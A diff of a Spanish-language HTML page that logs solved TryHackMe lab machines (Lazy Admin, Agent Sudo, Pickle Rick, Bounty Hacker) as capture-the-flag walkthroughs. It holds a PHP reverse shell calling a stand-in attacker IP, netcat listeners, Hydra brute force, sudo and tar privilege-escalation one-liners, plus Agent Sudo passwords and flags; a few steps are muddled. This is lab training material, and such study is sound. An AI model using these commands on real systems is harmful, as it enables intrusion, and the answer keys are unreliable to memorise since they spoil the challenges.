@@ -1,117 +1,381 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
- <meta charset="UTF-8">
- <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>Curso Pentester</title>
- <link rel="stylesheet" href="styles.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registro de Máquinas Virtuales TryHackMe</title>
+    <meta name="description" content="Registro de Máquinas Virtuales TryHackMe. Encuentra códigos aprendidos, scripts útiles, comandos útiles y más.">
+    <!-- Enlace al archivo CSS -->
+    <link href="https://fonts.googleapis.com/css2?family=Protest+Guerrilla&family=Poppins:wght@400;700&family=Open+Sans:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="tryhackme.css">
 </head>
 <body>
- <h1 style="font-family: Arial, sans-serif; color: #333; text-align: center;">Curso Pentester</h1>
- <div class="container">
-  <details>
-   <summary>Introducción a la Seguridad Ofensiva</summary>
-   <div>
-    <p>Hackea tu primer sitio web (legalmente en un entorno seguro) y experimenta el trabajo de un hacker ético.</p>
-    <h3 class="accordion-title">Tarea 1</h3>
-    <div class="panel">
-     <p>¿Qué es la Seguridad Ofensiva?</p>
-     <p>En resumen, la seguridad ofensiva es el proceso de penetrar en sistemas informáticos, explotar errores de software y encontrar lagunas en aplicaciones para obtener acceso no autorizado a ellas.</p>
-     <p>Para vencer a un hacker, necesitas comportarte como un hacker, encontrar vulnerabilidades y recomendar parches antes de que lo haga un ciberdelincuente, ¡como harás en esta sala!</p>
-     <p>Por otro lado, también está la seguridad defensiva, que es el proceso de proteger la red de una organización y los sistemas informáticos analizando y asegurando cualquier amenaza digital potencial.</p>
-     <form>
-      <label for="respuesta1">¿Cuál de las siguientes opciones representa mejor el proceso donde simulas las acciones de un hacker para encontrar vulnerabilidades en un sistema?</label><br>
-      <input type="text" id="respuesta1" name="respuesta1"><br>
-      <button type="button" onclick="verificarRespuesta1()">Submit</button>
-     </form>
-     <p id="respuesta1-feedback"></p>
-    </div>
-    <h3 class="accordion-title">Tarea 2</h3>
-    <div class="panel">
-     <p>Hackeando tu primera máquina</p>
-     <p>Antes de adentrarnos en las carreras de ciberseguridad y en qué consiste la seguridad ofensiva, permíteme llevarte al mundo del hackeo (y sí, es legal, todos los ejercicios son simulaciones ficticias).</p>
-     <p>Tu primer hack</p>
-     <p>Haz clic en el botón "Start Machine" (Iniciar máquina). Una vez cargado en Split View en tu navegador, tendrás acceso a una máquina que utilizarás para hackear una aplicación bancaria falsa llamada FakeBank. Si no ves aparecer la máquina, utiliza el botón azul "Show Split View" (Mostrar vista dividida) en la parte superior derecha de esta página.</p>
-     <p>Utilizaremos una aplicación de línea de comandos llamada "GoBuster" para hacer fuerza bruta en el sitio web de FakeBank y encontrar directorios y páginas ocultas. GoBuster tomará una lista de nombres de páginas o directorios potenciales y tratará de acceder a un sitio web con cada uno de ellos; si la página existe, te lo dirá.</p>
-     <p>Paso 1) Abre un terminal</p>
-     <p>Un terminal, también conocido como línea de comandos, nos permite interactuar con una computadora sin utilizar una interfaz gráfica de usuario. En la máquina, abre el terminal usando el ícono de Terminal:</p>
-     <p>¿Tienes problemas? Mira el video</p>
-     <p>Paso 2) Encuentra páginas web ocultas</p>
-     <p>La mayoría de las empresas tendrán una página de portal de administración, que brinda a su personal acceso a controles de administración básicos para operaciones diarias. Para un banco, un empleado podría necesitar transferir dinero hacia y desde las cuentas de los clientes. A menudo, estas páginas no se hacen privadas, lo que permite a los atacantes encontrar páginas ocultas que muestren o den acceso a controles de administración o datos sensibles.</p>
-     <p>Escribe el siguiente comando en el terminal para encontrar páginas potencialmente ocultas en el sitio web de FakeBank utilizando GoBuster (una aplicación de seguridad de línea de comandos).</p>
-     <pre>gobuster -u http://fakebank.com -w wordlist.txt dir</pre>
-     <pre>gobuster -u http://fakebank.com -w wordlist.txt dir</pre>
-     <p>El comando se ejecutará y te mostrará una salida similar a esta:</p>
-     <pre>ubuntu@tryhackme:~/Desktop$ gobuster -u http://fakebank.com -w wordlist.txt dir
 
-===============================================================
-Gobuster v3.0.1 - A fast & flexible directory/file bruteforcer
-===============================================================
-
-GET /robots.txt => 404 Not Found
-... (salida continúa) ...
-
-===============================================================
-Summary:
-===============================================================
-
-Directories: 12 Found
-Files: 0 Found
-
-===============================================================
-**Wordlist used:** /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-
-**Note:** The wordlist used might be outdated. Please consider using a more up-to-date wordlist.
-===============================================================
-</pre>
-     <p>**Explicación de la salida:**</p>
-     <ul>
-      <li>La primera línea muestra la versión de GoBuster que se está utilizando.</li>
-      <li>La segunda línea muestra el comando que se ejecutó.</li>
-      <li>La tercera línea muestra la URL del sitio web que se está atacando.</li>
-      <li>La cuarta línea muestra la ruta a la lista de palabras que se está utilizando.</li>
-      <li>La siguiente sección muestra una lista de directorios que GoBuster ha encontrado.</li>
-      <li>La última sección resume los resultados del ataque.</li>
-     </ul>
-     <p>**Próximos pasos:**</p>
-     <p>Ahora que has encontrado algunos directorios potenciales, puedes usar GoBuster para intentar acceder a ellos. Por ejemplo, para intentar acceder al directorio "/admin", puedes usar el siguiente comando:</p>
-     <pre>gobuster -u http://fakebank.com/admin -w wordlist.txt dir</pre>
-     <p>Si tienes éxito, GoBuster te mostrará una lista de archivos en el directorio.</p>
-     <p>¡Continúa explorando y descubre qué más puedes encontrar!</p>
+<div class="background-container">
+    
+    <div class="banner">
+        <h1>Registro de Máquinas Virtuales TryHackMe</h1>
+        <!-- Agrega un banner principal con tu nombre o un logo -->
+        <!-- Por ejemplo: <img src="banner.png" alt="Banner" class="image"> -->
     </div>
-    <h3 class="accordion-title">Tarea 3</h3>
-    <div class="panel">
-     <h4>¿Cómo puedo empezar a aprender?</h4>
-     <p>Mucha gente se pregunta cómo otros se convierten en hackers (consultores de seguridad) o defensores (analistas de seguridad que combaten el cibercrimen), y la respuesta es simple:</p>
-     <ul>
-      <li>**Descompónlo en pasos pequeños:** Elige un área de la ciberseguridad que te interese y comienza a aprender sobre ella.</li>
-      <li>**Practica con ejercicios prácticos:** Hay muchos recursos disponibles en línea, como TryHackMe, que te permiten practicar tus habilidades en un entorno seguro.</li>
-      <li>**Crea el hábito de aprender:** Dedica un tiempo cada día a aprender sobre ciberseguridad.</li>
-      <li>**Confía en ti mismo:** ¡Puedes hacerlo! Hay muchas personas que han utilizado TryHackMe para conseguir su primer trabajo en la industria de la seguridad.</li>
-     </ul>
-     <h4>Testimonios:</h4>
-     <ul>
-      <li>**Paul:** Pasó de ser trabajador de la construcción a ingeniero de seguridad. <a href="URL">Leer más</a></li>
-      <li>**Kassandra:** Pasó de ser profesora de música a profesional de la seguridad. <a href="URL">Leer más</a></li>
-      <li>**Brandon:** Usó TryHackMe mientras estaba en la escuela para conseguir su primer trabajo en ciberseguridad. <a href="URL">Leer más</a></li>
-     </ul>
-     <h4>¿Qué carreras hay?</h4>
-     <p>La sala de carreras en ciberseguridad profundiza en las diferentes opciones profesionales dentro de este campo. Sin embargo, aquí te presentamos una breve descripción de algunos roles de seguridad ofensiva:</p>
-     <ul>
-<li>**Probador de Penetración:** Es responsable de probar productos tecnológicos para encontrar vulnerabilidades de seguridad explotables.</li>
-      <li>**Equipo Rojo:** Simula ser un adversario, atacando a una organización y proporcionando retroalimentación desde la perspectiva de un enemigo.</li>
-      <li>**Ingeniero de Seguridad:** Diseña, monitorea y mantiene controles de seguridad, redes y sistemas para ayudar a prevenir ciberataques.</li>
-     </ul>
-     <h4>Recursos adicionales:</h4>
-     <ul>
-      <li><a href="https://tryhackme.com/">TryHackMe</a></li>
-      <li><a href="https://www.turismosevilla.org/es/que-ver-y-hacer/turismo-la-carta/turismo-de-reuniones-y-congresos/sala-carreras">Sala de carreras en ciberseguridad</a></li>
-      <li><a href="https://www.xataka.com/seleccion/que-libro-electronico-comprar-guia-compra-ebook-recomendaciones-11-modelos-destacados">Libro electrónico gratuito sobre carreras en ciberseguridad</a></li>
-     </ul>
+    <div class="container">
+        <div class="column">
+                      
+    <h2 onclick="toggleDetails('maquinas-resueltas')">Máquinas Virtuales Resueltas</h2>
+            <div id="maquinas-resueltas" class="details">
+
+<div id="lazy-admin">
+        <h3 onclick="toggleDetails('lazy-admin-details')">Lazy Admin</h3>
+        <div id="lazy-admin-details" class="details">
+            <img src="https://sirpeca.github.io/imagenes/maqresolv/lazyadmin.jpg" alt="Lazy Admin" class="image">
+            <h4 onclick="toggleDetails('lazy-admin-enumeracion')">1. Enumeración:</h4>
+            <div id="lazy-admin-enumeracion" class="details">
+                <h5>1.1 Comprobación de la disponibilidad de la máquina:</h5>
+                <p class="prompt">ping -c 1 &lt;ip&gt;</p>
+                <p>Este comando se utiliza para verificar si la máquina virtual está activa.</p>
+
+                <h5>1.2 Escaneo de puertos abiertos:</h5>
+                <p class="prompt">nmap -sC -sV &lt;ip&gt; -oN nmap</p>
+                <p>Se utiliza Nmap para escanear los puertos abiertos en la máquina virtual.</p>
+
+                <h5>1.3 Examinar la página web:</h5>
+                <p class="prompt">firefox http://&lt;ip&gt;</p>
+                <p>Se utiliza Firefox para visitar la página web alojada en la máquina virtual.</p>
+
+                <h5>1.4 Enumerar las rutas HTTP:</h5>
+                <p class="prompt">wfuzz -c -L -t 400 --sc=200,301 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://&lt;ip&gt;/FUZZ</p>
+                <p>Se utiliza wfuzz para enumerar las rutas HTTP.</p>
+            </div>
+            
+            <h4 onclick="toggleDetails('lazy-admin-explotacion')">2. Explotación:</h4>
+            <div id="lazy-admin-explotacion" class="details">
+                <h5>2.1 Explorar la ruta "/content":</h5>
+                <p class="prompt">firefox http://&lt;ip&gt;/content</p>
+                <p>Se utiliza Firefox para visitar la ruta /content en la máquina virtual.</p>
+
+                <h5>2.2 Buscar un exploit para SweetRice:</h5>
+                <p class="prompt">searchsploit sweetrice</p>
+                <p>Searchsploit es una herramienta que indexa exploits de diversas bases de datos públicas.</p>
+
+                <h5>2.3 Descargar y ejecutar el exploit:</h5>
+                <p class="prompt">wget https://www.exploit-db.com/exploits/44128/ -O exploit.sh</p>
+                <p>Se descarga el exploit específico para SweetRice desde Exploit Database.</p>
+
+                <h5>2.4 Crear una reverse shell:</h5>
+                <p class="prompt">nano exploit.html</p>
+                <p>Se utiliza el editor de texto nano para crear un archivo HTML llamado exploit.html.</p>
+
+                <h5>2.5 Iniciar una escucha en la máquina atacante:</h5>
+                <p class="prompt">nc -lvnp 1234</p>
+                <p>Se inicia Netcat en modo de escucha en el puerto 1234 para recibir la conexión de la reverse shell.</p>
+
+                <h5>2.6 Ejecutar el exploit en la máquina virtual:</h5>
+                <p class="prompt">firefox exploit.html</p>
+                <p>Se utiliza Firefox para visitar el archivo HTML exploit.html.</p>
+
+                <h5>2.7 Obtener una shell en la máquina virtual:</h5>
+                <p class="prompt">stty raw -echo fg</p>
+                <p>Estos comandos se utilizan para ajustar la shell interactiva obtenida de la reverse shell.</p>
+            </div>
+            
+            <h4 onclick="toggleDetails('lazy-admin-escalada')">3. Escalada de privilegios:</h4>
+            <div id="lazy-admin-escalada" class="details">
+                <h5>3.1 Comprobar los permisos de sudo:</h5>
+                <p class="prompt">sudo -l</p>
+                <p>Este comando muestra los comandos que el usuario actual puede ejecutar con privilegios de sudo.</p>
+
+                <h5>3.2 Modificar el script backup.pl:</h5>
+                <p class="prompt">nano /etc/copy.sh</p>
+                <p>Se utiliza el editor de texto nano para modificar el script backup.pl.</p>
+
+                <h5>3.3 Reemplazar la IP en el script con la IP de tu máquina atacante.</h5>
+
+                <h5>3.4 Iniciar una escucha en tu máquina atacante:</h5>
+                <p class="prompt">nc -lvnp 5554</p>
+                <p>Se inicia Netcat en modo de escucha en el puerto 5554 para recibir la conexión de la copia de seguridad modificada.</p>
+
+                <h5>3.5 Ejecutar el script backup.pl:</h5>
+                <p class="prompt">sudo /usr/bin/perl /home/itguy/backup.pl</p>
+                <p>Se ejecuta el script backup.pl con privilegios de sudo, que ahora apunta a la IP de la máquina atacante.</p>
+
+                <h5>3.6 Obtener acceso como root:</h5>
+                <p class="prompt">su</p>
+                <p>Se utiliza el comando su para cambiar al usuario root.</p>
+            </div>
+
+            <h4 onclick="toggleDetails('lazy-admin-captura')">4. Capturar la bandera:</h4>
+            <div id="lazy-admin-captura" class="details">
+                <p class="prompt">cat root.txt</p>
+                <p>Este comando lee y muestra el contenido del archivo root.txt, que contiene la flag de root.</p>
+            </div>
+        </div>
     </div>
-   </div>
-  </details>
- </div>
- <script src="script.js"></script>
+
+<div id="Agen-Sudo">
+    <h3 onclick="toggleDetails('agen-sudo-details')">Agent Sudo</h3>
+    <div id="agen-sudo-details" class="details">
+     <img src="https://sirpeca.github.io/imagenes/maqresolv/asudo.jpg" alt="Agen-Sudo" class="image">   
+        <h4 onclick="toggleDetails('agen-sudo-ping')">Fase de enumeración: Ping al host.</h4>
+        <div id="agen-sudo-ping" class="details">
+            <p>Realizamos un ping al host 10.10.10.10 para verificar la conectividad:</p>
+            <pre><code class="prompt">ping -c 1 10.10.10.10</code></pre>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-web')">Fase de enumeración: Exploración inicial del sitio web</h4>
+        <div id="agen-sudo-web" class="details">
+            <p>Accedemos al sitio web utilizando un navegador o herramienta como curl:</p>
+            <pre><code class="prompt">ir a http://10.10.10.10</code></pre>
+            <p>Observamos la pista en la cabecera User-Agent y el nombre del agente (R).</p>
+            <p>Modificamos el User-Agent en la petición HTTP para probar diferentes valores.</p>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-agent')">Fase de enumeración: Descubrimiento del nombre del agente</h4>
+        <div id="agen-sudo-agent" class="details">
+            <p>Utilizamos Burp Suite para interceptar la petición HTTP.</p>
+            <p>Configuramos Intruder con el método GET y la posición para sniper.</p>
+            <p>Cargamos la lista de caracteres (char.txt) como payloads.</p>
+            <p>Iniciamos el ataque y observamos que las letras C y R destacan los status.</p>
+            <p>Editamos la petición GET en el navegador para revelar el nombre del agente (Chris).</p>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-ftp')">Fase de cracking y fuerza bruta: Ataque al servicio FTP</h4>
+        <div id="agen-sudo-ftp" class="details">
+            <p>Ataque al servicio FTP utilizando Hydra:</p>
+            <pre><code class="prompt">hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ftp</code></pre>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-files')">Fase de análisis: Análisis de archivos</h4>
+        <div id="agen-sudo-files" class="details">
+            <p>Descargamos los archivos del FTP:</p>
+            <pre><code class="prompt">ftp 10.10.10.10</code></pre>
+            <pre><code class="prompt">dir</code></pre>
+            <pre><code class="prompt">mget *</code></pre>
+            <pre><code class="prompt">exit</code></pre>
+            <p>Analizamos la imagen cute-alien.png con Binwalk:</p>
+            <pre><code class="prompt">binwalk -e cute-alien.png</code></pre>
+            <p>Identificamos un archivo zip oculto en la imagen cutie.png.</p>
+            <pre><code class="prompt">binwalk -e cutie.png</code></pre>
+            <p>Extraemos el archivo zip utilizando 7zip y la contraseña obtenida (Alien).</p>
+            <pre><code class="prompt">7z x 8702.zip -pAlien</code></pre>
+            <p>Analizamos el contenido del archivo extraído.</p>
+            <pre><code class="prompt">cat TO_agentR.txt</code></pre>
+            <p>Decodificamos un mensaje oculto en TO_agentR.txt utilizando base64.</p>
+            <pre><code class="prompt">echo 'QXJLYTUX' | base64 -d</code></pre>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-exploit')">Fase de explotación: Acceso al servicio SSH</h4>
+        <div id="agen-sudo-exploit" class="details">
+            <p>Extraemos el mensaje oculto de la imagen cute-alien.png utilizando steghide y la contraseña "Area51":</p>
+            <pre><code class="prompt">steghide extract -sf cute-alien.png -p Area51</code></pre>
+            <p>Desciframos la contraseña del mensaje base64 para obtener la contraseña de SSH "hacker rules!" y el usuario "James":</p>
+            <pre><code class="prompt">echo 'aGFja2VyIHJ1bGVzIQ==' | base64 -d</code></pre>
+            <p>Accedemos al servicio SSH con las credenciales obtenidas:</p>
+            <pre><code class="prompt">ssh james@10.10.10.10</code></pre>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-reverse')">Búsqueda inversa de imágenes</h4>
+        <div id="agen-sudo-reverse" class="details">
+            <p>Ejecutamos un servidor HTTP en la máquina objetivo y descargamos la imagen alien-autopsy.jpg.</p>
+            <pre><code class="prompt">python3 -m http.server</code></pre>
+            <p>Descargamos la imagen en nuestra máquina.</p>
+            <pre><code class="prompt">wget http://10.10.10.10:8000/alien-autopsy.jpg</code></pre>
+            <p>Buscamos la imagen en Google Images para obtener más información sobre ella.</p>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-escalation')">Fase de escalada de privilegios</h4>
+        <div id="agen-sudo-escalation" class="details">
+            <p>Revisamos los permisos de sudo y descubrimos una vulnerabilidad (CVE-2019-14287) que permite ejecutar comandos con privilegios de root:</p>
+            <pre><code class="prompt">sudo -l</code></pre>
+            <p>Ejecutamos el exploit para obtener acceso como root:</p>
+            <pre><code class="prompt">sudo -u#-1 /bin/bash</code></pre>
+            <p>Accedemos al directorio root y leemos el archivo root.txt:</p>
+            <pre><code class="prompt">cd /root</code></pre>
+            <pre><code class="prompt">cat root.txt</code></pre>
+        </div>
+
+    <h4 onclick="toggleDetails('agen-sudo-respuestas-details')">Respuestas de Agent Sudo</h3>
+    <div id="agen-sudo-respuestas-details" class="details">
+        
+        <h4 onclick="toggleDetails('agen-sudo-respuestas-task1')">Task 1: Enumerate</h4>
+        <div id="agen-sudo-respuestas-task1" class="details">
+            <p>Enumerate the machine and get all the important information</p>
+            <p><strong>Answer the questions below</strong></p>
+            <p>How many open ports?</p>
+            <pre><code class="prompt">3</code></pre>
+            <p>How you redirect yourself to a secret page?</p>
+            <pre><code class="prompt">user-agent</code></pre>
+            <p>What is the agent name?</p>
+            <pre><code class="prompt">chris</code></pre>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-respuestas-task2')">Task 2: Hash cracking and brute-force</h4>
+        <div id="agen-sudo-respuestas-task2" class="details">
+            <p>Done enumerate the machine? Time to brute your way out.</p>
+            <p><strong>Answer the questions below</strong></p>
+            <p>FTP password</p>
+            <pre><code class="prompt">crystal</code></pre>
+            <p>Zip file password</p>
+            <pre><code class="prompt">alien</code></pre>
+            <p>Steg password</p>
+            <pre><code class="prompt">Area51</code></pre>
+            <p>Who is the other agent (in full name)?</p>
+            <pre><code class="prompt">james</code></pre>
+            <p>SSH password</p>
+            <pre><code class="prompt">hackerrules!</code></pre>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-respuestas-task3')">Task 3: Capture the user flag</h4>
+        <div id="agen-sudo-respuestas-task3" class="details">
+            <p>You know the drill.</p>
+            <p><strong>Answer the questions below</strong></p>
+            <p>What is the user flag?</p>
+            <pre><code class="prompt">b03d975e8c92a7c04146cfa7a5a313c7</code></pre>
+            <p>What is the incident of the photo called?</p>
+            <pre><code class="prompt">Roswell alien autopsy</code></pre>
+        </div>
+
+        <h4 onclick="toggleDetails('agen-sudo-respuestas-task4')">Task 4: Privilege escalation</h4>
+        <div id="agen-sudo-respuestas-task4" class="details">
+            <p>Enough with the extraordinary stuff? Time to get real.</p>
+            <p><strong>Answer the questions below</strong></p>
+            <p>CVE number for the escalation</p>
+            <pre><code class="prompt">CVE-2019-14287</code></pre>
+            <p>What is the root flag?</p>
+            <pre><code class="prompt">b53a02f55b57d4439e3341834d70c062</code></pre>
+            <p>(Bonus) Who is Agent R?</p>
+            <pre><code class="prompt">DesKel</code></pre>
+        </div>
+
+    </div>
+</div>
+
+                
+    <div id="rick-pepinillo">
+        <h3 onclick="toggleDetails('rick-pepinillo-details')">Rick Pepinillo</h3>
+        <div id="rick-pepinillo-details" class="details">
+            <img src="https://sirpeca.github.io/imagenes/maqresolv/pepinillo.jpg" alt="Rick Pepinillo" class="image">
+            <!-- Guía paso a paso -->
+            <h4 onclick="toggleDetails('pasoo-1')">Paso 1: Verificar la Conectividad y el TTL</h4>
+            <div id="pasoo-1" class="details">
+                <p>Antes de comenzar cualquier actividad de escaneo, es crucial verificar la conectividad con la máquina víctima y obtener información básica sobre ella, como el TTL (Time To Live) en la respuesta del ping.</p>
+                <p class="prompt">ping -c 1 &lt;ipmaquina&gt;</p>
+                <p>Este comando envía un solo paquete de ping a la dirección IP especificada. Observa el TTL en la respuesta del ping para obtener información adicional sobre la máquina.</p>
+            </div>
+            <h4 onclick="toggleDetails('pasoo-2')">Paso 2: Escaneo Inicial con Nmap</h4>
+            <div id="pasoo-2" class="details">
+                <p>El siguiente paso es realizar un escaneo inicial de puertos en la máquina utilizando la herramienta Nmap. Este escaneo proporcionará información sobre los puertos abiertos y los servicios en ejecución en la máquina víctima.</p>
+                <p class="prompt">nmap -A &lt;ipmaquina&gt; -oN nmap_picklerick_inicial</p>
+                <p>Este comando ejecuta un escaneo detallado de todos los puertos abiertos en la máquina y guarda los resultados en un archivo llamado "nmap_picklerick_inicial". El parámetro -A activa la detección de versiones y la detección de servicios.</p>
+            </div>
+            <h4 onclick="toggleDetails('pasoo-3')">Paso 3: Inspeccionar Directorios con Gobuster</h4>
+            <div id="pasoo-3" class="details">
+                <p>Para descubrir posibles directorios ocultos o archivos en la web de la máquina, utilizaremos la herramienta Gobuster. Esto nos permitirá obtener más información sobre la estructura del sitio web y encontrar posibles puntos de entrada.</p>
+                <p class="prompt">gobuster -u http://&lt;ipmaquina&gt; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,css,js,py</p>
+                <p>Este comando realiza un escaneo utilizando una lista de palabras clave contenida en el archivo "directory-list-2.3-medium.txt". La herramienta buscará archivos con las extensiones especificadas.</p>
+            </div>
+            <h4 onclick="toggleDetails('pasoo-4')">Paso 4: Acceder a Archivos Encontrados y Realizar Inyección de Comandos</h4>
+            <div id="pasoo-4" class="details">
+                <p>Después de realizar el escaneo con Gobuster, es posible que hayas encontrado archivos como "robots.txt" y "login.php". Accede a estos archivos utilizando un navegador web o herramientas como curl o wget. Si encuentras una posible contraseña en alguno de los archivos, tómala nota y guárdala en tu archivo de datos para referencia futura.</p>
+            </div>
+            <h4 onclick="toggleDetails('pasoo-5')">Paso 5: Realizar un Shell Inverso</h4>
+            <div id="pasoo-5" class="details">
+                <p>Si has identificado un punto de inyección de comandos en la máquina, puedes aprovecharlo para establecer un shell inverso. Esto te proporcionará acceso a la máquina víctima desde tu máquina de ataque.</p>
+                <p class="prompt">php -r '$sock=fsockopen("ATTACKING-IP",4444);exec("/bin/sh -i <&4 >&4 2>&4");'</p>
+                <p>Este comando abrirá una conexión de red hacia tu máquina y ejecutará un shell interactivo en la máquina víctima.</p>
+            </div>
+            <h4 onclick="toggleDetails('pasoo-6')">Paso 6: Escuchar el Shell Inverso</h4>
+            <div id="pasoo-6" class="details">
+                <p>En tu máquina de ataque, abre un programa como Netcat para escuchar la conexión de shell inverso.</p>
+                <p class="prompt">nc -nvlp 1234</p>
+                <p>Esto abrirá una escucha en el puerto 1234 para recibir la conexión de shell inverso desde la máquina víctima.</p>
+            </div>
+            <h4 onclick="toggleDetails('pasoo-7')">Paso 7: Elevar los Privilegios a Root</h4>
+            <div id="pasoo-7" class="details">
+                <p>Una vez dentro de la máquina víctima a través del shell inverso, ejecuta el siguiente comando para ver las opciones de sudo disponibles.</p>
+                <p class="prompt">sudo -l</p>
+                <p>Esto mostrará las opciones de sudo disponibles para el usuario actual. En este caso, se encontró una elevación de privilegios con Perl y el archivo backup.pl.</p>
+                <p class="prompt">cat backup.pl</p>
+                <p>Este comando mostrará el contenido del archivo backup.pl y nos permitirá comprender mejor cómo podemos aprovecharlo para elevar nuestros privilegios.</p>
+            </div>
+            <h4 onclick="toggleDetails('pasoo-8')">Paso 8: Búsqueda de Ingredientes</h4>
+            <div id="pasoo-8" class="details">
+                <p>Como usuario root en la máquina víctima, realiza una búsqueda de los tres ingredientes necesarios en los directorios relevantes utilizando comandos como find o grep. Esto nos permitirá completar el objetivo de la máquina virtual.</p>
+                <p class="prompt">find / -name "Salsa verde" 2&gt;/dev/null</p>
+                <p class="prompt">find / -name "Jugo de pepinillos" 2&gt;/dev/null</p>
+                <p class="prompt">find / -name "Morty Jue" 2&gt;/dev/null</p>
+                <p>Estos comandos buscarán los ingredientes en todo el sistema de archivos y nos proporcionarán las ubicaciones donde se encuentran.</p>
+            </div>
+    </div>
+    <div id="Bounty-Hacker">
+        <h3 onclick="toggleDetails('bounty-hacker-details')">Bounty Hacker</h3>
+        <div id="bounty-hacker-details" class="details">
+            <img src="https://sirpeca.github.io/imagenes/maqresolv/bhacker.jpg" alt="Bounty-Hacker" class="image">
+            <h4 onclick="toggleDetails('Bounty-Hacker-Paso1')">Paso 1: Escaneo inicial</h4>
+            <div id="Bounty-Hacker-Paso1" class="details">
+                <p>Identificar la dirección IP de la máquina víctima:</p>
+                <pre><code class="prompt">ping &lt;IP&gt;</code></pre>
+                <p>Este comando envía un paquete de prueba a la dirección IP especificada y espera una respuesta. Nos ayuda a verificar la conectividad y la disponibilidad de la máquina.</p>
+            </div>
+
+            <h4 onclick="toggleDetails('Bounty-Hacker-Paso2')">Paso 2: Enumeración y acceso inicial</h4>
+            <div id="Bounty-Hacker-Paso2" class="details">
+                <p>Exploración del servicio HTTP (puerto 80):</p>
+                <pre><code class="prompt">curl http://&lt;IP&gt;</code></pre>
+                <p>Curl es una herramienta de línea de comandos que se utiliza para transferir datos desde o hacia un servidor. En este caso, lo utilizamos para acceder al servicio web HTTP y obtener información sobre la página.</p>
+                
+                <p>Acceso al servicio FTP (puerto 21):</p>
+                <pre><code class="prompt">ftp &lt;IP&gt;</code></pre>
+                <p>Este comando inicia una sesión FTP con la máquina remota. Nos permite conectarnos al servicio FTP y explorar archivos en el servidor.</p>
+            </div>
+            
+            <!-- Más pasos aquí -->
+
+            <!-- Paso 5 -->
+            <h4 onclick="toggleDetails('Bounty-Hacker-Paso5')">Paso 5: Escalada de privilegios</h4>
+            <div id="Bounty-Hacker-Paso5" class="details">
+                <p>Revisión de permisos Sudo:</p>
+                <pre><code class="prompt">sudo -l</code></pre>
+                <p>Este comando muestra los privilegios sudo asignados al usuario actual en la máquina remota. Nos ayuda a identificar si tenemos permisos especiales que pueden ser explotados para obtener acceso de root.</p>
+                
+                <p>Explotación de binario Sudo:</p>
+                <pre><code class="prompt">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></pre>
+                <p>sudo tar: Utilizamos tar con el permiso sudo para crear un archivo tar vacío.</p>
+                <p>--checkpoint=1: Esta opción le indica a tar que ejecute el comando especificado después de cada archivo archivado.</p>
+                <p>--checkpoint-action=exec=/bin/sh: Esta opción ejecuta /bin/sh (una shell) después de cada archivo archivado, proporcionándonos acceso a una shell interactiva con privilegios de root.</p>
+            </div>
+            
+            <!-- Más pasos aquí -->
+
+    <h4 onclick="toggleDetails('Bounty-Hacker-Paso6')">Paso 6: Recolección de flags</h4>
+    <div id="Bounty-Hacker-Paso6" class="details">
+        <p>Recuperación de la flag de usuario y root:</p>
+        <p>Utiliza cat u otro comando para leer y recuperar el contenido de las flags.</p>
+    </div>
+</div>
+                <!-- Agrega más máquinas virtuales resueltas aquí -->
+            </div>
+        </div>
+    </div>
+</div>
+    <div class="social-icons">
+        <!-- Agrega enlaces a tus redes sociales o proyectos relacionados -->
+        <!-- Por ejemplo: -->
+        <!-- <a href="https://twitter.com/tu_usuario" target="_blank"><img src="twitter_icon.png" alt="Twitter"></a> -->
+        <!-- <a href="https://github.com/tu_usuario" target="_blank"><img src="github_icon.png" alt="GitHub"></a> -->
+        <a href="https://github.com/sirpeca" target="_blank" class="github-link"><img src="https://i.imgur.com/7h8z7D2.jpg" alt="GitHub"></a>
+
+    </div>
+
+    <script>
+        function toggleDetails(id) {
+            var details = document.getElementById(id);
+            if (details.style.display === "none") {
+                details.style.display = "block";
+            } else {
+                details.style.display = "none";
+            }
+        }
+    </script>
+    <link rel="icon" href="favicon.ico" type="image/x-icon"> <!-- Agrega el favicon.ico en la raíz de tu proyecto -->
 </body>
 </html>
